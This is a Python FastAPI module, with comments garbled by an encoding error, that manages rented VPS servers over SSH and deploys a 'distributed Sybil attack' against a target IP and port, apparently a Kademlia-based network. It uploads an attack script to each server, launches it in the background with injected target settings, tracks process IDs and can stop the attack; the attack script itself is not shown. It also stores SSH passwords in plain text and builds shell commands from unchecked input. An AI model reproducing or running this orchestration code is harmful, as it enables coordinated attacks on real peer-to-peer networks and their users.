# -*- coding: utf-8 -*-
"""
Å®Î×¹¥»÷·Ö²¼Ê½²¿ÊðAPI - ÕæÊµÍøÂç»·¾³VPS¹ÜÀí
"""
from fastapi import APIRouter, HTTPException, BackgroundTasks
from pydantic import BaseModel
from typing import Optional, List, Dict
import paramiko
import json
import os
import logging
import time
from datetime import datetime
from router.suppression import get_db_connection

router = APIRouter()
logger = logging.getLogger(__name__)


class VPSServerConfig(BaseModel):
    """VPS·þÎñÆ÷ÅäÖÃ"""
    name: str  # ·þÎñÆ÷Ãû³Æ£¬Èç VPS-1, VPS-2
    host: str  # IPµØÖ·
    port: int = 22
    username: str
    password: Optional[str] = None
    ssh_key_path: Optional[str] = None
    region: Optional[str] = None  # µØÀíÎ»ÖÃ
    description: Optional[str] = None


class DistributedAttackConfig(BaseModel):
    """·Ö²¼Ê½¹¥»÷ÅäÖÃ"""
    attack_name: str  # ¹¥»÷ÈÎÎñÃû³Æ
    target_ip: str
    target_port: int = 8000
    total_nodes: int = 256  # ×Ü¹¥»÷½ÚµãÊý
    vps_ids: List[int]  # Ê¹ÓÃµÄVPS IDÁÐ±í
    description: Optional[str] = None


def init_distributed_attack_tables():
    """³õÊ¼»¯·Ö²¼Ê½¹¥»÷Ïà¹Ø±í"""
    conn = get_db_connection()
    try:
        cursor = conn.cursor()
        
        # VPS·þÎñÆ÷ÅäÖÃ±í
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS vps_servers (
                id INT AUTO_INCREMENT PRIMARY KEY,
                name VARCHAR(100) NOT NULL,
                host VARCHAR(100) NOT NULL,
                port INT DEFAULT 22,
                username VARCHAR(100) NOT NULL,
                password VARCHAR(255),
                ssh_key_path VARCHAR(500),
                region VARCHAR(100),
                description TEXT,
                status VARCHAR(20) DEFAULT 'unknown',
                last_check_time DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                INDEX idx_name (name),
                INDEX idx_status (status)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        """)
        
        # ·Ö²¼Ê½¹¥»÷ÈÎÎñ±í
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS distributed_attack_tasks (
                id INT AUTO_INCREMENT PRIMARY KEY,
                task_id VARCHAR(100) UNIQUE NOT NULL,
                attack_name VARCHAR(200) NOT NULL,
                target_ip VARCHAR(100) NOT NULL,
                target_port INT DEFAULT 8000,
                total_nodes INT DEFAULT 256,
                vps_count INT DEFAULT 0,
                status VARCHAR(20) DEFAULT 'preparing',
                deployment_status JSON,
                attack_result JSON,
                start_time DATETIME DEFAULT CURRENT_TIMESTAMP,
                stop_time DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                INDEX idx_task_id (task_id),
                INDEX idx_status (status)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        """)
        
        # VPSÈÎÎñ·ÖÅä±í
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS vps_task_assignments (
                id INT AUTO_INCREMENT PRIMARY KEY,
                task_id VARCHAR(100) NOT NULL,
                vps_id INT NOT NULL,
                server_index INT NOT NULL,
                bucket_start INT NOT NULL,
                bucket_end INT NOT NULL,
                nodes_count INT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                pid INT,
                last_heartbeat DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                INDEX idx_task_id (task_id),
                INDEX idx_vps_id (vps_id),
                FOREIGN KEY (vps_id) REFERENCES vps_servers(id) ON DELETE CASCADE
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        """)
        
        conn.commit()
        logger.info("·Ö²¼Ê½¹¥»÷¹ÜÀí±í³õÊ¼»¯Íê³É")
    except Exception as e:
        logger.error(f"³õÊ¼»¯·Ö²¼Ê½¹¥»÷±íÊ§°Ü: {e}")
        conn.rollback()
    finally:
        conn.close()


# ³õÊ¼»¯±í
try:
    init_distributed_attack_tables()
except Exception as e:
    logger.error(f"³õÊ¼»¯·Ö²¼Ê½¹¥»÷ÏµÍ³±íÊ±³ö´í: {e}")


# ==================== VPS·þÎñÆ÷¹ÜÀí ====================

@router.post("/vps/add")
async def add_vps_server(config: VPSServerConfig):
    """Ìí¼ÓVPS·þÎñÆ÷"""
    conn = get_db_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO vps_servers (name, host, port, username, password, ssh_key_path, region, description)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
        """, (config.name, config.host, config.port, config.username, 
              config.password, config.ssh_key_path, config.region, config.description))
        conn.commit()
        
        vps_id = cursor.lastrowid
        
        return {
            "status": "success",
            "message": "VPS·þÎñÆ÷Ìí¼Ó³É¹¦",
            "vps_id": vps_id
        }
    except Exception as e:
        logger.error(f"Ìí¼ÓVPS·þÎñÆ÷Ê§°Ü: {e}")
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        conn.close()


@router.get("/vps/list")
async def list_vps_servers():
    """»ñÈ¡VPS·þÎñÆ÷ÁÐ±í"""
    conn = get_db_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id, name, host, port, username, region, description, status,
                   DATE_FORMAT(last_check_time, '%Y-%m-%d %H:%i:%s') as last_check_time,
                   DATE_FORMAT(created_at, '%Y-%m-%d %H:%i:%s') as created_at
            FROM vps_servers
            ORDER BY created_at DESC
        """)
        servers = cursor.fetchall()
        
        return {
            "status": "success",
            "data": servers
        }
    except Exception as e:
        logger.error(f"»ñÈ¡VPSÁÐ±íÊ§°Ü: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        conn.close()


@router.post("/vps/{vps_id}/test")
async def test_vps_connection(vps_id: int):
    """²âÊÔVPS SSHÁ¬½Ó"""
    conn = get_db_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            SELECT host, port, username, password, ssh_key_path
            FROM vps_servers WHERE id = %s
        """, (vps_id,))
        vps = cursor.fetchone()
        
        if not vps:
            raise HTTPException(status_code=404, detail="VPS²»´æÔÚ")
        
        # ³¢ÊÔSSHÁ¬½Ó
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            if vps['ssh_key_path']:
                ssh.connect(
                    vps['host'],
                    port=vps['port'],
                    username=vps['username'],
                    key_filename=vps['ssh_key_path'],
                    timeout=10
                )
            else:
                ssh.connect(
                    vps['host'],
                    port=vps['port'],
                    username=vps['username'],
                    password=vps['password'],
                    timeout=10
                )
            
            # ²âÊÔÖ´ÐÐÃüÁî
            stdin, stdout, stderr = ssh.exec_command('python3 --version')
            python_version = stdout.read().decode().strip()
            
            # ¸üÐÂ×´Ì¬
            cursor.execute("""
                UPDATE vps_servers
                SET status = 'online', last_check_time = NOW()
                WHERE id = %s
            """, (vps_id,))
            conn.commit()
            
            ssh.close()
            
            return {
                "status": "success",
                "message": "Á¬½Ó³É¹¦",
                "python_version": python_version
            }
        except Exception as e:
            # ¸üÐÂ×´Ì¬ÎªÀëÏß
            cursor.execute("""
                UPDATE vps_servers
                SET status = 'offline', last_check_time = NOW()
                WHERE id = %s
            """, (vps_id,))
            conn.commit()
            
            raise HTTPException(status_code=500, detail=f"Á¬½ÓÊ§°Ü: {str(e)}")
        finally:
            ssh.close()
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"²âÊÔVPSÁ¬½ÓÊ§°Ü: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        conn.close()


@router.delete("/vps/{vps_id}")
async def delete_vps_server(vps_id: int):
    """É¾³ýVPS·þÎñÆ÷"""
    conn = get_db_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("DELETE FROM vps_servers WHERE id = %s", (vps_id,))
        conn.commit()
        
        if cursor.rowcount == 0:
            raise HTTPException(status_code=404, detail="VPS²»´æÔÚ")
        
        return {
            "status": "success",
            "message": "VPS·þÎñÆ÷ÒÑÉ¾³ý"
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"É¾³ýVPSÊ§°Ü: {e}")
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        conn.close()


# ==================== ·Ö²¼Ê½¹¥»÷²¿Êð ====================

@router.post("/distributed/deploy")
async def deploy_distributed_attack(config: DistributedAttackConfig, background_tasks: BackgroundTasks):
    """²¿Êð·Ö²¼Ê½Å®Î×¹¥»÷"""
    task_id = f"distributed-sybil_{int(time.time())}"
    
    # ÑéÖ¤VPS
    conn = get_db_connection()
    try:
        cursor = conn.cursor()
        
        # ¼ì²éVPSÊÇ·ñ´æÔÚÇÒÔÚÏß
        placeholders = ','.join(['%s'] * len(config.vps_ids))
        cursor.execute(f"""
            SELECT id, name, host, port, username, password, ssh_key_path, status
            FROM vps_servers
            WHERE id IN ({placeholders})
        """, config.vps_ids)
        vps_list = cursor.fetchall()
        
        if len(vps_list) != len(config.vps_ids):
            raise HTTPException(status_code=400, detail="²¿·ÖVPS²»´æÔÚ")
        
        offline_vps = [v['name'] for v in vps_list if v['status'] == 'offline']
        if offline_vps:
            raise HTTPException(status_code=400, detail=f"ÒÔÏÂVPSÀëÏß: {', '.join(offline_vps)}")
        
        # ´´½¨¹¥»÷ÈÎÎñ
        cursor.execute("""
            INSERT INTO distributed_attack_tasks 
            (task_id, attack_name, target_ip, target_port, total_nodes, vps_count, status)
            VALUES (%s, %s, %s, %s, %s, %s, 'preparing')
        """, (task_id, config.attack_name, config.target_ip, config.target_port,
              config.total_nodes, len(vps_list)))
        conn.commit()
        
        # ºóÌ¨ÈÎÎñÖ´ÐÐ²¿Êð
        background_tasks.add_task(
            execute_distributed_deployment,
            task_id, config, vps_list
        )
        
        return {
            "status": "success",
            "message": "·Ö²¼Ê½¹¥»÷²¿ÊðÒÑÆô¶¯",
            "task_id": task_id,
            "vps_count": len(vps_list)
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"²¿Êð·Ö²¼Ê½¹¥»÷Ê§°Ü: {e}")
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        conn.close()


async def execute_distributed_deployment(task_id: str, config: DistributedAttackConfig, vps_list: List[Dict]):
    """Ö´ÐÐ·Ö²¼Ê½²¿Êð£¨ºóÌ¨ÈÎÎñ£©"""
    conn = get_db_connection()
    
    try:
        logger.info(f"[{task_id}] ¿ªÊ¼·Ö²¼Ê½²¿Êð£¬VPSÊýÁ¿: {len(vps_list)}")
        
        # ¼ÆËãÃ¿Ì¨VPS¸ºÔðµÄbucket·¶Î§
        total_buckets = 32  # KademliaµÄbucketÊýÁ¿
        nodes_per_bucket = config.total_nodes // total_buckets
        buckets_per_vps = total_buckets // len(vps_list)
        
        deployment_results = []
        
        for idx, vps in enumerate(vps_list):
            server_index = idx
            bucket_start = idx * buckets_per_vps
            bucket_end = bucket_start + buckets_per_vps - 1
            
            if idx == len(vps_list) - 1:  # ×îºóÒ»Ì¨VPS´¦ÀíÊ£ÓàµÄbucket
                bucket_end = total_buckets - 1
            
            nodes_count = (bucket_end - bucket_start + 1) * nodes_per_bucket
            
            logger.info(f"[{task_id}] ²¿Êðµ½ {vps['name']}: buckets {bucket_start}-{bucket_end}, {nodes_count} nodes")
            
            try:
                # SSHÁ¬½Óµ½VPS
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                if vps.get('ssh_key_path'):
                    ssh.connect(vps['host'], port=vps['port'], username=vps['username'],
                              key_filename=vps['ssh_key_path'], timeout=30)
                else:
                    ssh.connect(vps['host'], port=vps['port'], username=vps['username'],
                              password=vps['password'], timeout=30)
                
                sftp = ssh.open_sftp()
                
                # ÉÏ´«distributed_sybil.py½Å±¾
                local_script = '/home/spider/31339752/backend/suppression_scripts/docker-cluster-10 - ¸±±¾/distributed_sybil.py'
                remote_script = f'/tmp/sybil_attack_{task_id}.py'
                
                sftp.put(local_script, remote_script)
                
                # ÐÞ¸Ä½Å±¾ÖÐµÄÅäÖÃ
                script_content = f"""
import sys
sys.argv = ['distributed_sybil.py', '{server_index}']

# ÅäÖÃ
TARGET_HOSTNAME = '{config.target_ip}'
TARGET_PORT = {config.target_port}
TOTAL_SERVERS = {len(vps_list)}
MY_SERVER_ID = {server_index}
NODES_PER_SERVER = {nodes_count}

# µ¼Èë²¢ÔËÐÐÔ­½Å±¾
exec(open('{remote_script}').read())
"""
                
                # Æô¶¯¹¥»÷½ø³Ì
                command = f"nohup python3 -c \"{script_content}\" > /tmp/sybil_{task_id}.log 2>&1 & echo $!"
                stdin, stdout, stderr = ssh.exec_command(command)
                pid = int(stdout.read().decode().strip())
                
                # ¼ÇÂ¼·ÖÅäÐÅÏ¢
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT INTO vps_task_assignments
                    (task_id, vps_id, server_index, bucket_start, bucket_end, nodes_count, status, pid)
                    VALUES (%s, %s, %s, %s, %s, %s, 'running', %s)
                """, (task_id, vps['id'], server_index, bucket_start, bucket_end, nodes_count, pid))
                conn.commit()
                
                deployment_results.append({
                    "vps_name": vps['name'],
                    "status": "success",
                    "pid": pid,
                    "nodes_count": nodes_count
                })
                
                sftp.close()
                ssh.close()
                
                logger.info(f"[{task_id}] {vps['name']} ²¿Êð³É¹¦, PID={pid}")
                
            except Exception as e:
                logger.error(f"[{task_id}] {vps['name']} ²¿ÊðÊ§°Ü: {e}")
                deployment_results.append({
                    "vps_name": vps['name'],
                    "status": "failed",
                    "error": str(e)
                })
        
        # ¸üÐÂÈÎÎñ×´Ì¬
        cursor = conn.cursor()
        cursor.execute("""
            UPDATE distributed_attack_tasks
            SET status = 'running',
                deployment_status = %s
            WHERE task_id = %s
        """, (json.dumps(deployment_results, ensure_ascii=False), task_id))
        conn.commit()
        
        logger.info(f"[{task_id}] ·Ö²¼Ê½²¿ÊðÍê³É")
        
    except Exception as e:
        logger.error(f"[{task_id}] ·Ö²¼Ê½²¿ÊðÊ§°Ü: {e}")
        cursor = conn.cursor()
        cursor.execute("""
            UPDATE distributed_attack_tasks
            SET status = 'failed'
            WHERE task_id = %s
        """, (task_id,))
        conn.commit()
    finally:
        conn.close()


@router.get("/distributed/tasks")
async def list_distributed_tasks():
    """»ñÈ¡·Ö²¼Ê½¹¥»÷ÈÎÎñÁÐ±í"""
    conn = get_db_connection()
    try:
        cursor = conn.cursor()
        cursor.execute("""
            SELECT task_id, attack_name, target_ip, target_port, total_nodes, vps_count,
                   status, deployment_status, attack_result,
                   DATE_FORMAT(start_time, '%Y-%m-%d %H:%i:%s') as start_time,
                   DATE_FORMAT(stop_time, '%Y-%m-%d %H:%i:%s') as stop_time
            FROM distributed_attack_tasks
            ORDER BY start_time DESC
            LIMIT 50
        """)
        tasks = cursor.fetchall()
        
        # ½âÎöJSON×Ö¶Î
        for task in tasks:
            if task.get('deployment_status'):
                task['deployment_status'] = json.loads(task['deployment_status'])
            if task.get('attack_result'):
                task['attack_result'] = json.loads(task['attack_result'])
        
        return {
            "status": "success",
            "data": tasks
        }
    except Exception as e:
        logger.error(f"»ñÈ¡·Ö²¼Ê½ÈÎÎñÁÐ±íÊ§°Ü: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        conn.close()


@router.post("/distributed/{task_id}/stop")
async def stop_distributed_attack(task_id: str):
    """Í£Ö¹·Ö²¼Ê½¹¥»÷"""
    conn = get_db_connection()
    try:
        cursor = conn.cursor()
        
        # »ñÈ¡ËùÓÐVPS·ÖÅä
        cursor.execute("""
            SELECT a.vps_id, a.pid, v.host, v.port, v.username, v.password, v.ssh_key_path, v.name
            FROM vps_task_assignments a
            JOIN vps_servers v ON a.vps_id = v.id
            WHERE a.task_id = %s AND a.status = 'running'
        """, (task_id,))
        assignments = cursor.fetchall()
        
        stopped_count = 0
        for assign in assignments:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                if assign.get('ssh_key_path'):
                    ssh.connect(assign['host'], port=assign['port'], username=assign['username'],
                              key_filename=assign['ssh_key_path'], timeout=10)
                else:
                    ssh.connect(assign['host'], port=assign['port'], username=assign['username'],
                              password=assign['password'], timeout=10)
                
                # É±ËÀ½ø³Ì
                ssh.exec_command(f"kill {assign['pid']}")
                
                # ¸üÐÂ×´Ì¬
                cursor.execute("""
                    UPDATE vps_task_assignments
                    SET status = 'stopped'
                    WHERE vps_id = %s AND task_id = %s
                """, (assign['vps_id'], task_id))
                
                ssh.close()
                stopped_count += 1
                logger.info(f"[{task_id}] ÒÑÍ£Ö¹ {assign['name']}")
                
            except Exception as e:
                logger.error(f"[{task_id}] Í£Ö¹ {assign['name']} Ê§°Ü: {e}")
        
        # ¸üÐÂÈÎÎñ×´Ì¬
        cursor.execute("""
            UPDATE distributed_attack_tasks
            SET status = 'stopped', stop_time = NOW()
            WHERE task_id = %s
        """, (task_id,))
        conn.commit()
        
        return {
            "status": "success",
            "message": f"ÒÑÍ£Ö¹ {stopped_count}/{len(assignments)} ¸öVPS½Úµã"
        }
        
    except Exception as e:
        logger.error(f"Í£Ö¹·Ö²¼Ê½¹¥»÷Ê§°Ü: {e}")
        conn.rollback()
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        conn.close()


@router.get("/distributed/{task_id}/status")
async def get_distributed_attack_status(task_id: str):
    """»ñÈ¡·Ö²¼Ê½¹¥»÷×´Ì¬"""
    conn = get_db_connection()
    try:
        cursor = conn.cursor()
        
        # »ñÈ¡ÈÎÎñÐÅÏ¢
        cursor.execute("""
            SELECT *
            FROM distributed_attack_tasks
            WHERE task_id = %s
        """, (task_id,))
        task = cursor.fetchone()
        
        if not task:
            raise HTTPException(status_code=404, detail="ÈÎÎñ²»´æÔÚ")
        
        # »ñÈ¡VPS·ÖÅä×´Ì¬
        cursor.execute("""
            SELECT a.*, v.name as vps_name, v.host,
                   DATE_FORMAT(a.last_heartbeat, '%Y-%m-%d %H:%i:%s') as last_heartbeat
            FROM vps_task_assignments a
            JOIN vps_servers v ON a.vps_id = v.id
            WHERE a.task_id = %s
        """, (task_id,))
        assignments = cursor.fetchall()
        
        return {
            "status": "success",
            "task": task,
            "vps_assignments": assignments
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"»ñÈ¡·Ö²¼Ê½¹¥»÷×´Ì¬Ê§°Ü: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        conn.close()
